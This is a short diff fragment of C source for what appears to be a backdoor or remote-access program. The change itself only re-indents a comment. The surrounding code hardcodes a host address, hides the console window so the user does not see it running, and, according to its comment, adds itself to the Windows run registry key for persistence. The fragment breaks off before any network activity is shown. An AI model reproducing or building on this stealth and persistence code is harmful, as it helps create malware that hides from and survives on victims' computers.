@@ -11,7 +11,7 @@
 const char szHost[] = "192.168.1.140";
 
 int main(const int argc, const char* argv[]){
-	// === Do some typical stuff, hide the console and do some registry editing
+    // === Do some typical stuff, hide the console and do some registry editing
     // == Hide the console window
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     // == Add self into run reg key - ensures some persistence
